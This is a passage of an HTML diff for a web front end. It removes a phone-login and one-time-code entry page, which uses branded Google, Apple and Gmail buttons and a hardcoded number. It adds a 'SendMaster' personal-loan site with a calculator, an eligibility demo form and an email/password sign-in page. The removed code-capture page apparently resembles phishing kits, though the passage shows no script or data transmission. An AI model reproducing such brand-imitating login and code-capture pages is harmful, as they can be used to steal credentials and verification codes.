-                <span class="flag-emoji" id="selectedFlag">🇺🇸</span>
-                <span class="dial-code" id="selectedDial">+1</span>
-                <span class="arrow">▼</span>
-            </div>
-            <div class="country-dropdown" id="countryDropdown" role="listbox"></div>
-            <input type="tel" class="phone-input" id="phoneInput" placeholder="Phone number" inputmode="numeric" oninput="handlePhoneInput()" autocomplete="tel">
-        </div>
-
-        <!-- Biometrics Toggle -->
-        <div class="biometrics-section">
-            <label class="biometrics-label" onclick="toggleBiometrics()">
-                <span class="biometrics-icon" aria-hidden="true">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm3.5-9c.83 0 1.5-.67 1.5-1.5S16.33 8 15.5 8 14 8.67 14 9.5s.67 1.5 1.5 1.5zm-7 0c.83 0 1.5-.67 1.5-1.5S9.33 8 8.5 8 7 8.67 7 9.5 7.67 11 8.5 11zm3.5 6.5c2.33 0 4.31-1.46 5.11-3.5H6.89c.8 2.04 2.78 3.5 5.11 3.5z"/>
-                    </svg>
-                </span>
-                Enable biometrics
-            </label>
-            <div class="toggle off" id="biometricsToggle" onclick="toggleBiometrics()" role="switch" aria-checked="false" tabindex="0">
-                <div class="toggle-circle"></div>
-            </div>
-        </div>
-
-        <!-- Login Button -->
-        <button class="login-btn" onclick="handleLogin()">Log in</button>
-
-        <!-- Divider -->
-        <div class="divider">or</div>
-
-        <!-- Social Buttons -->
-        <div class="social-buttons">
-            <button class="social-btn" onclick="handleGoogle()">
-                <div class="social-icon" aria-hidden="true">
-                    <svg viewBox="0 0 48 48">
-                        <path fill="#FFC107" d="M43.611 20.083H42V20H24v8h11.303c-1.649 4.657-6.08 8-11.303 8-6.627 0-12-5.373-12-12s5.373-12 12-12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 12.955 4 4 12.955 4 24s8.955 20 20 20 20-8.955 20-20c0-1.341-.138-2.65-.389-3.917z"/>
-                        <path fill="#FF3D00" d="M6.306 14.691l6.571 4.819C14.655 15.108 18.961 12 24 12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 16.318 4 9.656 8.337 6.306 14.691z"/>
-                        <path fill="#4CAF50" d="M24 44c5.166 0 9.86-1.977 13.409-5.192l-6.19-5.238C29.211 35.091 26.715 36 24 36c-5.202 0-9.619-3.317-11.283-7.946l-6.522 5.025C9.505 39.556 16.227 44 24 44z"/>
-                        <path fill="#1976D2" d="M43.611 20.083H42V20H24v8h11.303c-.792 2.237-2.231 4.166-4.087 5.571.001-.001.002-.001.003-.002l6.19 5.238C36.971 39.205 44 34 44 24c0-1.341-.138-2.65-.389-3.917z"/>
-                    </svg>
-                </div>
-                Continue with Google
-            </button>
-
-            <button class="social-btn" onclick="handleApple()">
-                <div class="social-icon" aria-hidden="true">
-                    <svg viewBox="0 0 24 24" fill="#000">
-                        <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
-                    </svg>
-                </div>
-                Continue with Apple
-            </button>
-
-            <button class="social-btn" onclick="handleEmail()">
-                <div class="social-icon" aria-hidden="true">
-                    <svg viewBox="0 0 24 24" fill="#D94A3D">
-                        <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
-                        <rect x="2" y="4" width="20" height="16" rx="2" fill="none" stroke="#D94A3D" stroke-width="1.5"/>
-                        <polyline points="2,6 12,11 22,6" fill="none" stroke="#fff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
-                    </svg>
-                </div>
-                Continue with Gmail
-            </button>
-        </div>
-
-        <!-- Footer -->
-        <div class="footer">
-            <p class="footer-text">
-                <a href="#" class="footer-link" onclick="handleTrouble(event)">Trouble logging in?</a>
-            </p>
-            <p class="signup-text">
-                Don&apos;t have an account? <a href="#" class="footer-link" onclick="handleSignup(event)">Sign up</a>
-            </p>
+        <div id="page-nav-quick" class="d-flex gap-1">
+            <span class="small text-muted me-2 align-self-center">Jump Page:</span>
+            <button class="btn btn-sm btn-outline-light py-0 px-2 text-capitalize" onclick="navigateTo('index.html')">Home</button>
+            <button class="btn btn-sm btn-outline-light py-0 px-2 text-capitalize" onclick="navigateTo('eligibility.html')">Eligibility</button>
+            <button class="btn btn-sm btn-outline-light py-0 px-2 text-capitalize" onclick="navigateTo('loan-details.html')">Details</button>
+            <button class="btn btn-sm btn-outline-light py-0 px-2 text-capitalize" onclick="navigateTo('login.html')">Login</button>
         </div>
     </div>
 
-    <!-- ════════════════ CODE VERIFICATION PAGE ════════════════ -->
-    <div class="code-container" id="codeContainer">
-        <div class="code-header">
-            <button class="code-close-btn" onclick="closeCodePage()" aria-label="Close">×</button>
-        </div>
-        <div class="code-icon" aria-hidden="true">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                <rect x="2" y="5" width="20" height="14" rx="2"></rect>
-                <line x1="2" y1="10" x2="22" y2="10"></line>
-            </svg>
-        </div>
-        <h2 class="code-title">Enter code</h2>
-        <p class="code-description" id="codeDescription">We sent a 6-digit code to +1 301-525-6024.</p>
-
-        <div class="code-inputs">
-            <input type="text" class="code-input" id="code1" maxlength="1" placeholder="0" inputmode="numeric" autocomplete="one-time-code" onkeyup="handleCodeInput(this, 'code2')">
-            <input type="text" class="code-input" id="code2" maxlength="1" placeholder="0" inputmode="numeric" onkeyup="handleCodeInput(this, 'code3')">
-            <input type="text" class="code-input" id="code3" maxlength="1" placeholder="0" inputmode="numeric" onkeyup="handleCodeInput(this, 'code4')">
-            <input type="text" class="code-input" id="code4" maxlength="1" placeholder="0" inputmode="numeric" onkeyup="handleCodeInput(this, 'code5')">
-            <input type="text" class="code-input" id="code5" maxlength="1" placeholder="0" inputmode="numeric" onkeyup="handleCodeInput(this, 'code6')">
-            <input type="text" class="code-input" id="code6" maxlength="1" placeholder="0" inputmode="numeric" onkeyup="handleCodeInput(this, null)">
-        </div>
-
-        <div class="resend-section">
-            <div class="resend-text">Didn't get the code? Resend in <span class="resend-timer" id="resendTimer">22 seconds</span> via:</div>
-            <div class="resend-buttons">
-                <button class="resend-btn" id="smsBtn" onclick="handleSMS()" disabled>
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
-                        <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
-                    </svg>
-                    SMS
+    <!-- MAIN APP WRAPPER -->
+    <div id="app-preview-container">
+        <!-- GLOBAL NAVBAR -->
+        <nav class="navbar navbar-expand-lg navbar-light bg-white border-bottom sticky-top">
+            <div class="container">
+                <a class="navbar-brand" href="javascript:void(0)" onclick="navigateTo('index.html')">
+                    <span class="brand-icon">S</span> SendMaster
+                </a>
+                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#mainNavbar">
+                    <span class="navbar-toggler-icon"></span>
                 </button>
-                <button class="resend-btn" id="whatsappBtn" onclick="handleWhatsApp()" disabled>
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
-                        <path d="M21.65 2.358a10.94 10.94 0 0 0-17.3 0C2.79 4.048 2 6.265 2 8.5c0 5.527 4.582 10 10 10 .33 0 .659-.014.985-.038l2.305 2.867a1.5 1.5 0 0 0 2.42-1.565l-.574-3.57a9.985 9.985 0 0 0 3.885-7.994c0-2.235-.79-4.452-2.355-6.212z"></path>
-                    </svg>
-                    WhatsApp
-                </button>
+                <div class="collapse navbar-collapse" id="mainNavbar">
+                    <ul class="navbar-nav me-auto mb-2 mb-lg-0 ms-lg-4">
+                        <li class="nav-item">
+                            <a class="nav-link" id="nav-index" href="javascript:void(0)" onclick="navigateTo('index.html')">Home</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" id="nav-eligibility" href="javascript:void(0)" onclick="navigateTo('eligibility.html')">Check Eligibility</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" id="nav-loan-details" href="javascript:void(0)" onclick="navigateTo('loan-details.html')">Loan Details</a>
+                        </li>
+                    </ul>
+                    <div class="d-flex align-items-center gap-2">
+                        <a href="javascript:void(0)" onclick="navigateTo('login.html')" class="btn btn-outline-dark me-2">Sign In</a>
+                        <a href="javascript:void(0)" onclick="navigateTo('eligibility.html')" class="btn btn-green">Check Eligibility</a>
+                    </div>
+                </div>
+            </div>
+        </nav>
+
+        <!-- ========================================== -->
+        <!-- PAGE 1: index.html                          -->
+        <!-- ========================================== -->
+        <div id="page-index" class="page-view active-page">
+            <!-- Hero Section -->
+            <section class="hero-section">
+                <div class="container">
+                    <div class="row align-items-center gy-5">
+                        <div class="col-lg-6">
+                            <span class="badge bg-success bg-opacity-25 text-success border border-success border-opacity-25 mb-3 px-3 py-2 rounded-pill">
+                                <i class="fa-solid fa-shield-halved me-1"></i> Transparent Lending Information
+                            </span>
+                            <h1 class="display-5 fw-bold mb-3">Explore Your Loan Options</h1>
+                            <p class="lead text-light opacity-75 mb-4">
+                                Review customizable personal loan possibilities, understand U.S. lending eligibility requirements, and estimate your payments transparently before you connect with a lender.
+                            </p>
+                            <div class="d-flex flex-wrap gap-3">
+                                <a href="javascript:void(0)" onclick="navigateTo('eligibility.html')" class="btn btn-green btn-lg px-4">
+                                    Check Eligibility <i class="fa-solid fa-arrow-right ms-2"></i>
+                                </a>
+                                <a href="#how-it-works" class="btn btn-outline-light btn-lg px-4">How It Works</a>
+                            </div>
+                            <div class="mt-4 pt-2 d-flex align-items-center gap-4 text-light opacity-75 small">
+                                <div><i class="fa-solid fa-check text-success me-1"></i> No Credit Score Impact to Check</div>
+                                <div><i class="fa-solid fa-check text-success me-1"></i> Transparent Terms</div>
+                            </div>
+                        </div>
+                        <div class="col-lg-6">
+                            <div class="calculator-box">
+                                <div class="d-flex justify-content-between align-items-center mb-3">
+                                    <h3 class="h5 fw-bold m-0"><i class="fa-solid fa-calculator text-success me-2"></i> Loan Estimate Preview</h3>
+                                    <span class="badge bg-light text-dark border">Informational</span>
+                                </div>
+                                <div class="mb-4">
+                                    <label for="hero-amount" class="form-label fw-semibold d-flex justify-content-between">
+                                        <span>Desired Amount:</span>
+                                        <span class="text-success fw-bold" id="hero-amount-val">$10,000</span>
+                                    </label>
+                                    <input type="range" class="form-range" id="hero-amount" min="1000" max="40000" step="500" value="10000" oninput="updateHeroCalc()">
+                                    <div class="d-flex justify-content-between small text-muted">
+                                        <span>$1,000</span>
+                                        <span>$40,000</span>
+                                    </div>
+                                </div>
+                                <div class="mb-4">
+                                    <label for="hero-term" class="form-label fw-semibold">Repayment Term:</label>
+                                    <select class="form-select" id="hero-term" onchange="updateHeroCalc()">
+                                        <option value="24">24 Months (2 Years)</option>
+                                        <option value="36" selected>36 Months (3 Years)</option>
+                                        <option value="48">48 Months (4 Years)</option>
+                                        <option value="60">60 Months (5 Years)</option>
+                                    </select>
+                                </div>
+                                <div class="p-3 bg-light rounded-3 mb-4 border">
+                                    <div class="row text-center">
+                                        <div class="col-6 border-end">
+                                            <div class="small text-muted mb-1">Est. Monthly Payment</div>
+                                            <div class="h4 fw-bold text-navy m-0" id="hero-monthly-payment">$322 / mo</div>
+                                        </div>
+                                        <div class="col-6">
+                                            <div class="small text-muted mb-1">Representative APR Range</div>
+                                            <div class="h6 fw-bold text-dark m-0 pt-1">5.99% - 24.99%</div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <button onclick="saveAndProceedToEligibility()" class="btn btn-green w-100 py-3">
+                                    Check Eligibility With This Amount <i class="fa-solid fa-arrow-right ms-1"></i>
+                                </button>
+                                <p class="text-muted text-center extra-small mt-2 mb-0" style="font-size: 0.75rem;">
+                                    *Estimate only. Actual rate and terms vary by participating lender and verified borrower criteria.
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Key Features / Value Pillars -->
+            <section class="py-5">
+                <div class="container">
+                    <div class="text-center max-width-700 mx-auto mb-5">
+                        <h2 class="fw-bold">Why Explore Loans Through SendMaster?</h2>
+                        <p class="text-muted">We prioritize financial clarity, plain-language legal criteria, and user privacy.</p>
+                    </div>
+                    <div class="row g-4">
+                        <div class="col-md-3">
+                            <div class="custom-card p-4 h-100">
+                                <div class="feature-icon"><i class="fa-solid fa-magnifying-glass-dollar"></i></div>
+                                <h3 class="h5 fw-bold">Clear Information</h3>
+                                <p class="text-muted small mb-0">Learn about interest structures, origination fees, and repayment schedules upfront before committing.</p>
+                            </div>
+                        </div>
+                        <div class="col-md-3">
+                            <div class="custom-card p-4 h-100">
+                                <div class="feature-icon"><i class="fa-solid fa-user-shield"></i></div>
+                                <h3 class="h5 fw-bold">U.S. Eligibility Criteria</h3>
+                                <p class="text-muted small mb-0">Review standard lending benchmarks including legal age, verifiable income, and residency requirements.</p>
+                            </div>
+                        </div>
+                        <div class="col-md-3">
+                            <div class="custom-card p-4 h-100">
+                                <div class="feature-icon"><i class="fa-solid fa-handshake"></i></div>
+                                <h3 class="h5 fw-bold">Repayment Transparency</h3>
+                                <p class="text-muted small mb-0">No hidden surprises. Calculate sample schedules and understand total cost of borrowing.</p>
+                            </div>
+                        </div>
+                        <div class="col-md-3">
+                            <div class="custom-card p-4 h-100">
+                                <div class="feature-icon"><i class="fa-solid fa-headset"></i></div>
+                                <h3 class="h5 fw-bold">Customer Support</h3>
+                                <p class="text-muted small mb-0">Our support team is available to assist with questions regarding application navigation and process updates.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Step by Step Section -->
+            <section id="how-it-works" class="py-5 bg-white border-top border-bottom">
+                <div class="container">
+                    <div class="text-center mb-5">
+                        <h2 class="fw-bold">Simple 3-Step Information Process</h2>
+                        <p class="text-muted">Navigating your options without pressure</p>
+                    </div>
+                    <div class="row g-4">
+                        <div class="col-md-4">
+                            <div class="p-4 rounded-3 bg-light border h-100">
+                                <div class="step-badge">1</div>
+                                <h3 class="h5 fw-bold">Review Eligibility Criteria</h3>
+                                <p class="text-muted small mb-0">Explore standard U.S. consumer loan guidelines and submit non-sensitive criteria to tailor information.</p>
+                            </div>
+                        </div>
+                        <div class="col-md-4">
+                            <div class="p-4 rounded-3 bg-light border h-100">
+                                <div class="step-badge">2</div>
+                                <h3 class="h5 fw-bold">Examine Loan Terms</h3>
+                                <p class="text-muted small mb-0">Understand potential APRs, term options, origination fees, and repayment obligations in detail.</p>
+                            </div>
+                        </div>
+                        <div class="col-md-4">
+                            <div class="p-4 rounded-3 bg-light border h-100">
+                                <div class="step-badge">3</div>
+                                <h3 class="h5 fw-bold">Access SendMaster Portal</h3>
+                                <p class="text-muted small mb-0">Proceed to account login to track updates or interact with connected lender services securely.</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="text-center mt-5">
+                        <a href="javascript:void(0)" onclick="navigateTo('eligibility.html')" class="btn btn-navy btn-lg">Start by Checking Eligibility</a>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Disclosure Banner -->
+            <section class="py-4 bg-light">
+                <div class="container">
+                    <div class="disclosure-box">
+                        <p class="fw-bold mb-1"><i class="fa-solid fa-circle-info me-1 text-primary"></i> Important Consumer Disclosure</p>
+                        <p class="mb-0">
+                            SendMaster is an informational loan platform and financial service portal intended for U.S. residents. SendMaster is not a direct lender for all products and does not guarantee loan approval or specific interest rates. All loan decisions, rates, and terms depend on formal identity verification, credit checks, and final underwriting approval by a participating lender.
+                        </p>
+                    </div>
+                </div>
+            </section>
+        </div>
+
+        <!-- ========================================== -->
+        <!-- PAGE 2: eligibility.html                   -->
+        <!-- ========================================== -->
+        <div id="page-eligibility" class="page-view">
+            <div class="bg-navy text-white py-4 mb-4" style="background-color: var(--navy-primary);">
+                <div class="container">
+                    <h1 class="h2 fw-bold text-white mb-2">Check Your Loan Eligibility</h1>
+                    <p class="text-light opacity-75 mb-0">Review common U.S. lending standards and test your preferred options safely.</p>
+                </div>
+            </div>
+
+            <div class="container mb-5">
+                <div class="row g-4">
+                    <!-- Left: Educational Requirements -->
+                    <div class="col-lg-5">
+                        <div class="custom-card p-4 h-100">
+                            <h2 class="h5 fw-bold mb-3"><i class="fa-solid fa-list-check text-success me-2"></i> Standard U.S. Lending Criteria</h2>
+                            <p class="text-muted small mb-4">To qualify for a personal loan with most U.S. financial institutions, applicants generally must satisfy the following basic requirements:</p>
+
+                            <div class="d-flex mb-3">
+                                <div class="me-3 text-success fs-5"><i class="fa-solid fa-cake-candles"></i></div>
+                                <div>
+                                    <h3 class="h6 fw-bold mb-1">Legal Age Requirement</h3>
+                                    <p class="text-muted small mb-0">You must be at least 18 years old (or 19 in certain states like AL and NE).</p>
+                                </div>
+                            </div>
+                            <hr class="my-3 text-muted opacity-25">
+
+                            <div class="d-flex mb-3">
+                                <div class="me-3 text-success fs-5"><i class="fa-solid fa-flag-usa"></i></div>
+                                <div>
+                                    <h3 class="h6 fw-bold mb-1">U.S. Citizenship or Legal Residency</h3>
+                                    <p class="text-muted small mb-0">A valid Social Security Number (SSN) or Permanent Resident Card with a valid U.S. street address.</p>
+                                </div>
+                            </div>
+                            <hr class="my-3 text-muted opacity-25">
+
+                            <div class="d-flex mb-3">
+                                <div class="me-3 text-success fs-5"><i class="fa-solid fa-briefcase"></i></div>
+                                <div>
+                                    <h3 class="h6 fw-bold mb-1">Verifiable Regular Income</h3>
+                                    <p class="text-muted small mb-0">Demonstrable steady employment, self-employment, or regular retirement/disability benefit income.</p>
+                                </div>
+                            </div>
+                            <hr class="my-3 text-muted opacity-25">
+
+                            <div class="d-flex">
+                                <div class="me-3 text-success fs-5"><i class="fa-solid fa-credit-card"></i></div>
+                                <div>
+                                    <h3 class="h6 fw-bold mb-1">Credit & Banking Assessment</h3>
+                                    <p class="text-muted small mb-0">Active bank account for funds disbursement and a credit check assessing payment history and debt ratios.</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Right: Informational Demo Form -->
+                    <div class="col-lg-7">
+                        <div class="custom-card p-4">
+                            <div class="d-flex justify-content-between align-items-center mb-3">
+                                <h2 class="h4 fw-bold m-0">Eligibility Demonstration Form</h2>
+                                <span class="badge bg-warning text-dark"><i class="fa-solid fa-lock-open me-1"></i> Non-Sensitive Info Only</span>
+                            </div>
+                            
+                            <div class="alert alert-info border-0 rounded-3 small mb-4">
+                                <i class="fa-solid fa-circle-info me-1"></i> <strong>Informational Notice:</strong> This interactive form collects general preferences to customize information on the next page. It does <strong>not</strong> require SSN, banking details, or full legal identity, and submitting it does not constitute a real credit inquiry or official approval.
+                            </div>
+
+                            <form id="eligibilityForm" onsubmit="handleEligibilitySubmit(event)">
+                                <div class="mb-3">
+                                    <label for="el-amount" class="form-label fw-semibold">Preferred Loan Amount ($USD)</label>
+                                    <div class="input-group">
+                                        <span class="input-group-text">$</span>
+                                        <input type="number" class="form-control" id="el-amount" min="1000" max="50000" step="500" placeholder="e.g. 10000" required>
+                                    </div>
+                                    <div class="form-text">Enter an amount between $1,000 and $50,000.</div>
+                                </div>
+
+                                <div class="mb-3">
+                                    <label for="el-purpose" class="form-label fw-semibold">Primary Loan Purpose</label>
+                                    <select class="form-select" id="el-purpose" required>
+                                        <option value="" selected disabled>Select a purpose...</option>
+                                        <option value="Debt Consolidation">Debt Consolidation</option>
+                                        <option value="Home Improvement">Home Improvement</option>
+                                        <option value="Major Expense">Major / Emergency Expense</option>
+                                        <option value="Business Expansion">Small Business Expenses</option>
+                                        <option value="Auto / Vehicle">Vehicle Purchase / Repair</option>
+                                    </select>
+                                </div>
+
+                                <div class="row g-3 mb-3">
+                                    <div class="col-md-6">
+                                        <label for="el-state" class="form-label fw-semibold">State of Residence</label>
+                                        <select class="form-select" id="el-state" required>
+                                            <option value="" selected disabled>Select State...</option>
+                                            <option value="CA">California (CA)</option>
+                                            <option value="FL">Florida (FL)</option>
+                                            <option value="NY">New York (NY)</option>
+                                            <option value="TX">Texas (TX)</option>
+                                            <option value="IL">Illinois (IL)</option>
+                                            <option value="OTHER">Other U.S. State</option>
+                                        </select>
+                                    </div>
+                                    <div class="col-md-6">
+                                        <label for="el-income" class="form-label fw-semibold">Estimated Annual Income</label>
+                                        <select class="form-select" id="el-income" required>
+                                            <option value="" selected disabled>Select Income Range...</option>
+                                            <option value="Under $35,000">Under $35,000</option>
+                                            <option value="$35,000 - $60,000">$35,000 - $60,000</option>
+                                            <option value="$60,000 - $100,000">$60,000 - $100,000</option>
+                                            <option value="Over $100,000">Over $100,000</option>
+                                        </select>
+                                    </div>
+                                </div>
+
+                                <div class="mb-4 form-check">
+                                    <input type="checkbox" class="form-check-input" id="el-terms" required>
+                                    <label class="form-check-label small text-muted" for="el-terms">
+                                        I understand that this is a non-binding demonstration tool to preview sample terms and loan details.
+                                    </label>
+                                </div>
+
+                                <div id="eligibility-error" class="alert alert-danger py-2 d-none small">
+                                    Please fill out all required fields properly.
+                                </div>
+
+                                <div class="d-flex justify-content-between align-items-center pt-2">
+                                    <a href="javascript:void(0)" onclick="navigateTo('index.html')" class="btn btn-outline-secondary">Back to Home</a>
+                                    <button type="submit" class="btn btn-green btn-lg px-4">
+                                        Continue <i class="fa-solid fa-arrow-right ms-2"></i>
+                                    </button>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
             </div>
         </div>
 
-        <div class="change-number">
-            Don't have access to this number? <a href="#" class="change-number-link" onclick="handleChangeNumber(event)">Change number</a>
+        <!-- ========================================== -->
+        <!-- PAGE 3: loan-details.html                  -->
+        <!-- ========================================== -->
+        <div id="page-loan-details" class="page-view">
+            <div class="bg-navy text-white py-4 mb-4" style="background-color: var(--navy-primary);">
+                <div class="container">
+                    <h1 class="h2 fw-bold text-white mb-2">Review Your Loan Options</h1>
+                    <p class="text-light opacity-75 mb-0">Transparent terms breakdown based on your preferences.</p>
+                </div>
+            </div>
+
+            <div class="container mb-5">
+                <!-- User Selected Options Summary Banner -->
+                <div class="custom-card p-4 mb-4 bg-white border-start border-4 border-success">
+                    <div class="row align-items-center">
+                        <div class="col-md-8">
+                            <h2 class="h5 fw-bold mb-2">Selection Summary</h2>
+                            <p class="text-muted small mb-1">
+                                Preferred Amount: <strong class="text-dark" id="summary-amount">$10,000</strong> &bull; 
+                                Purpose: <strong class="text-dark" id="summary-purpose">Debt Consolidation</strong>
+                            </p>
+                            <p class="text-muted small mb-0">
+                                Residence: <strong class="text-dark" id="summary-state">CA</strong> &bull; 
+                                Income Bracket: <strong class="text-dark" id="summary-income">$60,000 - $100,000</strong>
+                            </p>
+                        </div>
+                        <div class="col-md-4 text-md-end mt-3 mt-md-0">
+                            <a href="javascript:void(0)" onclick="navigateTo('eligibility.html')" class="btn btn-sm btn-outline-secondary">
+                                <i class="fa-solid fa-pen-to-square me-1"></i> Adjust Selection
+                            </a>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="row g-4">
+                    <!-- Term Options Breakdown -->
+                    <div class="col-lg-8">
+                        <div class="custom-card p-4 mb-4">
+                            <h3 class="h5 fw-bold mb-3"><i class="fa-solid fa-table-list text-success me-2"></i> Representative Repayment Options</h3>
+                            <p class="text-muted small mb-4">Below is an example breakdown of standard repayment terms for the selected amount. Actual available options will depend on underwriting.</p>
+
+                            <div class="table-responsive">
+                                <table class="table table-hover align-middle border">
+                                    <thead class="table-light">
+                                        <tr>
+                                            <th>Term</th>
+                                            <th>Sample APR Range</th>
+                                            <th>Est. Monthly Payment</th>
+                                            <th>Total Payments</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody id="terms-table-body">
+                                        <!-- Dynamically populated via JS -->
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+
+                        <!-- Important Terms & Conditions Explanations -->
+                        <div class="custom-card p-4">
+                            <h3 class="h5 fw-bold mb-3"><i class="fa-solid fa-scale-balanced text-navy me-2"></i> Key Lending Terms Explained</h3>
+                            <div class="accordion" id="loanTermsAccordion">
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header">
+                                        <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#acc1">
+                                            Annual Percentage Rate (APR) & Fees
+                                        </button>
+                                    </h2>
+                                    <div id="acc1" class="accordion-collapse collapse show" data-bs-parent="#loanTermsAccordion">
+                                        <div class="accordion-body small text-muted">
+                                            APR reflects the total annual cost of borrowing, including interest rate and any lender origination fees (typically ranging from 1% to 6% of loan amount). Qualified applicants receive specific interest offers after full lender evaluation.
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header">
+                                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#acc2">
+                                            Prepayment & Late Penalties
+                                        </button>
+                                    </h2>
+                                    <div id="acc2" class="accordion-collapse collapse" data-bs-parent="#loanTermsAccordion">
+                                        <div class="accordion-body small text-muted">
+                                            SendMaster partner networks emphasize flexible repayment. Most personal loans feature no prepayment penalties, allowing you to pay off your balance early to save on interest.
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header">
+                                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#acc3">
+                                            Credit Assessment & Soft Inquiry
+                                        </button>
+                                    </h2>
+                                    <div id="acc3" class="accordion-collapse collapse" data-bs-parent="#loanTermsAccordion">
+                                        <div class="accordion-body small text-muted">
+                                            Initial eligibility checks utilize soft credit inquiries which do not impact your credit score. If you proceed with a specific lender application, a hard credit check may be performed.
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Right Column Action & Disclosures -->
+                    <div class="col-lg-4">
+                        <div class="custom-card p-4 text-center sticky-lg-top" style="top: 90px; z-index: 10;">
+                            <div class="feature-icon mx-auto"><i class="fa-solid fa-user-check"></i></div>
+                            <h3 class="h5 fw-bold mb-2">Ready to Proceed?</h3>
+                            <p class="text-muted small mb-4">
+                                Access your SendMaster account or create a profile to manage your information and securely view customized lender connections.
+                            </p>
+
+                            <!-- EXACT REQUIRED BUTTON HTML STRUCTURE -->
+                            <div class="mb-3">
+                                <a href="login.html" class="btn btn-primary proceed-btn w-100 py-3" onclick="handleProceedClick(event)">
+                                    Proceed to Login to SendMaster
+                                </a>
+                            </div>
+
+                            <div class="disclosure-box text-start mt-4">
+                                <p class="fw-bold mb-1 extra-small text-dark"><i class="fa-solid fa-triangle-exclamation text-warning me-1"></i> Verification Notice</p>
+                                <p class="extra-small mb-0" style="font-size: 0.75rem;">
+                                    Final eligibility, rates, and repayment terms are determined exclusively by the lender following document verification and complete credit underwriting.
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ========================================== -->
+        <!-- PAGE 4: login.html                         -->
+        <!-- ========================================== -->
+        <div id="page-login" class="page-view">
+            <div class="container py-5">
+                <div class="row justify-content-center">
+                    <div class="col-md-6 col-lg-5">
+                        <div class="custom-card p-4 p-sm-5 shadow-lg">
+                            <div class="text-center mb-4">
+                                <div class="brand-icon mx-auto mb-2" style="width: 48px; height: 48px; font-size: 1.5rem;">S</div>
+                                <h1 class="h3 fw-bold text-navy">Sign in to SendMaster</h1>
+                                <p class="text-muted small">Access your account portal and loan status</p>
+                            </div>
+
+                            <form id="loginForm" onsubmit="handleLoginSubmit(event)">
+                                <div class="mb-3">
+                                    <label for="login-email" class="form-label fw-semibold">Email Address</label>
+                                    <div class="input-group">
+                                        <span class="input-group-text"><i class="fa-solid fa-envelope text-muted"></i></span>
+                                        <input type="email" class="form-control" id="login-email" placeholder="name@example.com" required>
+                                    </div>
+                                </div>
+
+                                <div class="mb-3">
+                                    <div class="d-flex justify-content-between align-items-center mb-1">
+                                        <label for="login-password" class="form-label fw-semibold m-0">Password</label>
+                                        <a href="javascript:void(0)" onclick="showForgotPasswordModal()" class="small text-decoration-none text-success">Forgot Password?</a>
+                                    </div>
+                                    <div class="input-group">
+                                        <span class="input-group-text"><i class="fa-solid fa-lock text-muted"></i></span>
+                                        <input type="password" class="form-control" id="login-password" placeholder="Enter password" required>
+                                        <button class="btn btn-outline-secondary" type="button" id="togglePasswordBtn" onclick="togglePasswordVisibility()">
+                                            <i class="fa-solid fa-eye" id="togglePasswordIcon"></i>
+                                        </button>
+                                    </div>
+                                </div>
+
+                                <div class="mb-4 form-check d-flex justify-content-between">
+                                    <div>
+                                        <input type="checkbox" class="form-check-input" id="rememberMe">
+                                        <label class="form-check-label small text-muted" for="rememberMe">Remember me</label>
+                                    </div>
+                                </div>
+
+                                <div id="login-alert" class="alert alert-info py-2 d-none small">
+                                    Demonstration login submitted successfully.
+                                </div>
+
+                                <button type="submit" class="btn btn-green w-100 py-3 mb-3">
+                                    Sign In <i class="fa-solid fa-right-to-bracket ms-1"></i>
+                                </button>
+
+                                <div class="text-center pt-2 border-top">
+                                    <p class="small text-muted mb-0">
+                                        <a href="javascript:void(0)" onclick="navigateTo('index.html')" class="text-navy fw-semibold text-decoration-none">
